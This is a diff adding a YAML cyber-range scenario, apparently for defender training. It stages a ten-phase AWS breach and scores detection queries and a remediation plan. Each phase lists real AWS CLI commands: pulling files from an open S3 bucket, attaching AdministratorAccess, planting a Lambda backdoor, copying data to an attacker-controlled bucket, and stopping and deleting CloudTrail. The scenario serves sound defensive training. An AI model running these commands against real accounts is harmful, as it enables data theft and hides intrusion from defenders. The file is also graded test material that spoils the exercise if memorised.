@@ -1,0 +1,268 @@
+name: cloud-breach
+version: "1.0"
+range_template: cloud-security
+difficulty: hard
+duration_minutes: 75
+phase_count: 10
+description: |
+  Cloud infrastructure compromise scenario simulating an attacker who
+  discovers an exposed S3 bucket, steals AWS credentials, escalates
+  privileges through IAM misconfiguration, deploys a Lambda backdoor,
+  and manipulates CloudTrail to cover tracks. Requires understanding of
+  cloud-native attack patterns and detection mechanisms.
+author: TrueNorth Range
+
+mitre_attack:
+  - T1530      # Data from Cloud Storage Object
+  - T1552.005  # Unsecured Credentials: Cloud Instance Metadata
+  - T1078.004  # Valid Accounts: Cloud Accounts
+  - T1098.003  # Account Manipulation: Additional Cloud Roles
+  - T1584.007  # Compromise Infrastructure: Serverless
+  - T1562.008  # Impair Defenses: Disable Cloud Logs
+  - T1087.004  # Account Discovery: Cloud Account
+  - T1580      # Cloud Infrastructure Discovery
+  - T1537      # Transfer Data to Cloud Account
+  - T1190      # Exploit Public-Facing Application
+
+timeline:
+  - phase: 1
+    t: "00:00"
+    name: "Reconnaissance - S3 Bucket Discovery"
+    action: simulated_execution
+    params:
+      technique: T1580
+      description: "Attacker discovers publicly accessible S3 bucket via Google dorking"
+      commands:
+        - "aws s3 ls s3://company-backups --no-sign-request"
+        - "aws s3 cp s3://company-backups/config/app.env . --no-sign-request"
+      artifacts:
+        - type: s3_access_log
+          bucket: "company-backups"
+          action: "GetObject"
+          requester: "ANONYMOUS"
+          key: "config/app.env"
+    mitre: T1530
+
+  - phase: 2
+    t: "00:05"
+    name: "Credential Theft - Leaked AWS Keys"
+    action: simulated_execution
+    params:
+      technique: T1552.005
+      description: "Extract AWS access keys from exposed environment file"
+      artifacts:
+        - type: credential_exposure
+          access_key_id: "AKIAIOSFODNN7EXAMPLE"
+          secret_scope: "dev-deploy"
+          source_file: "app.env"
+    mitre: T1552.005
+
+  - phase: 3
+    t: "00:10"
+    name: "Initial Access - Validate Stolen Credentials"
+    action: simulated_execution
+    params:
+      technique: T1078.004
+      commands:
+        - "aws sts get-caller-identity"
+        - "aws iam list-attached-user-policies --user-name dev-deploy"
+      artifacts:
+        - type: cloudtrail_event
+          event_name: "GetCallerIdentity"
+          source_ip: "{{ attacker_ip }}"
+          user_identity: "dev-deploy"
+    mitre: T1078.004
+
+  - phase: 4
+    t: "00:18"
+    name: "Discovery - Cloud Enumeration"
+    action: simulated_execution
+    params:
+      technique: T1087.004
+      commands:
+        - "aws iam list-users"
+        - "aws iam list-roles"
+        - "aws lambda list-functions"
+        - "aws ec2 describe-instances"
+        - "aws s3api list-buckets"
+        - "aws rds describe-db-instances"
+      artifacts:
+        - type: cloudtrail_event
+          event_name: "ListUsers"
+          error_code: null
+        - type: cloudtrail_event
+          event_name: "ListRoles"
+          error_code: null
+    mitre: T1087.004
+
+  - phase: 5
+    t: "00:28"
+    name: "Privilege Escalation - IAM Policy Attachment"
+    action: simulated_execution
+    params:
+      technique: T1098.003
+      description: "Exploit iam:* permission on dev-deploy to attach AdministratorAccess"
+      commands:
+        - "aws iam attach-user-policy --user-name dev-deploy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+      artifacts:
+        - type: cloudtrail_event
+          event_name: "AttachUserPolicy"
+          request_parameters:
+            userName: "dev-deploy"
+            policyArn: "arn:aws:iam::aws:policy/AdministratorAccess"
+    mitre: T1098.003
+
+  - phase: 6
+    t: "00:35"
+    name: "Persistence - Lambda Backdoor"
+    action: simulated_execution
+    params:
+      technique: T1584.007
+      description: "Create a Lambda function that creates new IAM credentials on invocation"
+      commands:
+        - "aws lambda create-function --function-name health-check --runtime python3.11 --handler index.handler --role arn:aws:iam::{{ account_id }}:role/lambda-exec --zip-file fileb://backdoor.zip"
+        - "aws events put-rule --name daily-health --schedule-expression 'rate(1 day)'"
+      artifacts:
+        - type: cloudtrail_event
+          event_name: "CreateFunction20150331"
+          function_name: "health-check"
+    mitre: T1584.007
+
+  - phase: 7
+    t: "00:42"
+    name: "Collection - Access Sensitive Buckets"
+    action: simulated_execution
+    params:
+      technique: T1530
+      commands:
+        - "aws s3 sync s3://secret-configs ./exfil/configs"
+        - "aws s3 cp s3://company-backups/db-dumps/prod-2026-02.sql.gz ./exfil/"
+      artifacts:
+        - type: s3_access_log
+          bucket: "secret-configs"
+          action: "GetObject"
+          total_objects: 35
+          total_bytes: 250000000
+    mitre: T1530
+
+  - phase: 8
+    t: "00:52"
+    name: "Exfiltration - Transfer to External Account"
+    action: simulated_execution
+    params:
+      technique: T1537
+      description: "Copy data to attacker-controlled AWS account"
+      commands:
+        - "aws s3 cp ./exfil/ s3://attacker-bucket-{{ random_id }}/ --recursive"
+      artifacts:
+        - type: cloudtrail_event
+          event_name: "PutObject"
+          bucket: "attacker-bucket"
+          source_ip: "{{ attacker_ip }}"
+    mitre: T1537
+
+  - phase: 9
+    t: "01:00"
+    name: "Defense Evasion - CloudTrail Manipulation"
+    action: simulated_execution
+    params:
+      technique: T1562.008
+      commands:
+        - "aws cloudtrail stop-logging --name management-trail"
+        - "aws cloudtrail delete-trail --name management-trail"
+      artifacts:
+        - type: cloudtrail_event
+          event_name: "StopLogging"
+          trail_name: "management-trail"
+        - type: cloudtrail_event
+          event_name: "DeleteTrail"
+    mitre: T1562.008
+
+  - phase: 10
+    t: "01:10"
+    name: "Persistence - Additional Access Keys"
+    action: simulated_execution
+    params:
+      technique: T1098.003
+      commands:
+        - "aws iam create-access-key --user-name admin"
+        - "aws iam create-user --user-name svc-monitor"
+        - "aws iam attach-user-policy --user-name svc-monitor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+      description: "Create additional persistence mechanisms before logging stops"
+    mitre: T1098.003
+
+objectives:
+  - id: detect_s3_exposure
+    type: detection
+    description: "Identify anonymous access to S3 bucket"
+    validator: opensearch_query
+    params:
+      query: 'event_source:s3 AND requester:ANONYMOUS AND bucket:company-backups'
+      min_hits: 1
+    points: 10
+
+  - id: detect_stolen_creds
+    type: detection
+    description: "Detect use of dev-deploy credentials from unusual IP"
+    validator: opensearch_query
+    params:
+      query: 'eventName:GetCallerIdentity AND userIdentity.userName:dev-deploy AND sourceIPAddress:{{ attacker_ip }}'
+      min_hits: 1
+    points: 15
+
+  - id: detect_priv_esc
+    type: detection
+    description: "Detect IAM privilege escalation"
+    validator: opensearch_query
+    params:
+      query: 'eventName:AttachUserPolicy AND requestParameters.policyArn:*AdministratorAccess*'
+      min_hits: 1
+    points: 15
+
+  - id: detect_lambda_backdoor
+    type: detection
+    description: "Identify suspicious Lambda function creation"
+    validator: opensearch_query
+    params:
+      query: 'eventName:CreateFunction* AND requestParameters.functionName:health-check'
+      min_hits: 1
+    points: 15
+
+  - id: detect_cloudtrail_stop
+    type: detection
+    description: "Detect CloudTrail logging disabled"
+    validator: opensearch_query
+    params:
+      query: 'eventName:(StopLogging OR DeleteTrail)'
+      min_hits: 1
+    points: 15
+
+  - id: detect_data_exfil
+    type: detection
+    description: "Identify large data transfer from S3"
+    validator: opensearch_query
+    params:
+      query: 'event_source:s3 AND bucket:secret-configs AND bytesTransferredOut:>100000000'
+      min_hits: 1
+    points: 15
+
+  - id: remediation_plan
+    type: deliverable
+    description: "Submit cloud incident remediation plan"
+    validator: deliverable_check
+    params:
+      key: "cloud-remediation-plan.pdf"
+      required_sections:
+        - "Credential rotation"
+        - "IAM policy review"
+        - "Lambda function audit"
+        - "CloudTrail restoration"
+    points: 15
+
+scoring:
+  total_points: 100
+  passing_score: 70
+  time_bonus:
+    enabled: true
+    max_bonus: 10
+    threshold_minutes: 55
